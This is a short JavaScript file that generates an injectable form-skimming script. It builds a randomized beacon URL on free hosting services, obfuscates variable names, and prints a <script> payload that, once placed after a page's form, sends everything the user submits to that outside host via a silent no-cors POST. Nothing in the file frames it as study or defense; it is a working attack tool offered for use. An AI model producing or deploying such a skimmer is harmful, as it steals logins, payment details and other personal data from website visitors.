import { randomBytes } from 'crypto';
const dict = 'abcdefghijklmnopqrstuvwxyz';
const rand = (l=6) => Array.from({length:l},()=>dict[Math.random()*26|0]).join('');
const beacon = `https://${rand(8)}.${['workers.dev','herokuapp.com','onrender.com'][Date.now()%3]}/r`;
const vars = { f:rand(), e:rand(), u:rand() };

const code = `const ${vars.f}=document.currentScript.previousElementSibling;
${vars.f}.addEventListener('submit',${vars.e}=>{
  fetch('${beacon}?id='+encodeURIComponent('${randomBytes(4).toString('hex')}'),
  {method:'POST',body:new URLSearchParams(new FormData(${vars.f})),mode:'no-cors',keepalive:true});
},{once:true});`;

console.log(`Beacon: ${beacon}`);
console.log(`Inject:\n<script>${code}</script>`);
